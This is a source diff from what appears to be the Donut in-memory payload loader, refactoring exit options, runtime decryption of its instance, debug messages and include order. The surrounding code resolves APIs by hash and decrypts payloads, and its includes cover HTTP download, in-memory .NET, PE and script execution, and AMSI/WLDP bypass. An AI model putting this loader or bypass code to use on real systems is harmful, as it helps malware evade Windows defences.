@@ -73,7 +73,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
     if(pv == NULL) {
       DPRINT("Memory allocation failed...");
       // terminate host process?
-      if(inst->exit) {
+      if(inst->exit_opt == DONUT_OPT_EXIT_PROCESS) {
         DPRINT("Terminating host process");
         _RtlExitUserProcess(0);
       }
@@ -86,34 +86,35 @@ DWORD ThreadProc(LPVOID lpParameter) {
     DPRINT("Zero initializing PDONUT_ASSEMBLY");
     Memset(&assembly, 0, sizeof(assembly));
     
-#if !defined(NOCRYPTO)
-    PBYTE           inst_data;
-    // load pointer to data just past len + key
-    inst_data = (PBYTE)inst + offsetof(DONUT_INSTANCE, api_cnt);
-    
-    DPRINT("Decrypting %li bytes of instance", inst->len);
-    
-    donut_decrypt(inst->key.mk, 
-            inst->key.ctr, 
-            inst_data, 
-            inst->len - offsetof(DONUT_INSTANCE, api_cnt));
-    
-    DPRINT("Generating hash to verify decryption");
-    ULONG64 mac = maru(inst->sig, inst->iv);
-    DPRINT("Instance : %"PRIX64" | Result : %"PRIX64, inst->mac, mac);
-    
-    if(mac != inst->mac) {
-      DPRINT("Decryption of instance failed");
-      goto erase_memory;
+    // if encryption used
+    if(inst->entropy == DONUT_ENTROPY_DEFAULT) {
+      PBYTE inst_data;
+      // load pointer to data just past len + key
+      inst_data = (PBYTE)inst + offsetof(DONUT_INSTANCE, api_cnt);
+      
+      DPRINT("Decrypting %li bytes of instance", inst->len);
+      
+      donut_decrypt(inst->key.mk, 
+              inst->key.ctr, 
+              inst_data, 
+              inst->len - offsetof(DONUT_INSTANCE, api_cnt));
+      
+      DPRINT("Generating hash to verify decryption");
+      ULONG64 mac = maru(inst->sig, inst->iv);
+      DPRINT("Instance : %"PRIX64" | Result : %"PRIX64, inst->mac, mac);
+      
+      if(mac != inst->mac) {
+        DPRINT("Decryption of instance failed");
+        goto erase_memory;
+      }
     }
-#endif
     DPRINT("Resolving LoadLibraryA");
     
     inst->api.addr[0] = xGetProcAddress(inst, inst->api.hash[0], inst->iv);
     if(inst->api.addr[0] == NULL) return -1;
     
     for(i=0; i<inst->dll_cnt; i++) {
-      DPRINT("Loading %s ...", inst->dll_name[i]);
+      DPRINT("Loading %i of %i : %s ...", (i+1), inst->dll_cnt, inst->dll_name[i]);
       inst->api.LoadLibraryA(inst->dll_name[i]);
     }
     
@@ -158,10 +159,10 @@ DWORD ThreadProc(LPVOID lpParameter) {
         goto erase_memory;
     }
     
-    DPRINT("Compression engine is %"PRIx32, mod->compress);
-    
     // module data is compressed?
     if(mod->compress != DONUT_COMPRESS_NONE) {
+      DPRINT("Compression engine is %"PRIx32, mod->compress);
+      
       DPRINT("Allocating %zd bytes of memory for decompressed file and module information", 
         mod->len + sizeof(DONUT_MODULE));
       
@@ -244,7 +245,7 @@ erase_memory:
     }
     
     // should we call RtlExitUserProcess?
-    term = (BOOL)inst->exit;
+    term = (BOOL)inst->exit_opt;
     
     DPRINT("Erasing RW memory for instance");
     Memset(inst, 0, inst->len);
@@ -267,13 +268,11 @@ int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[]) {
       -1, output, DONUT_MAX_NAME);
 }
 
+#include "peb.c"             // resolve functions in export table
 #include "http_client.c"     // For downloading module
-
 #include "inmem_dotnet.c"    // .NET assemblies
 #include "inmem_pe.c"        // Unmanaged PE/DLL files
 #include "inmem_script.c"    // VBS/JS files
-
-#include "peb.c"             // resolve functions in export table
 
 #include "bypass.c"          // Bypass AMSI and WLDP
 #include "getpc.c"           // code stub to return program counter (always at the end!)
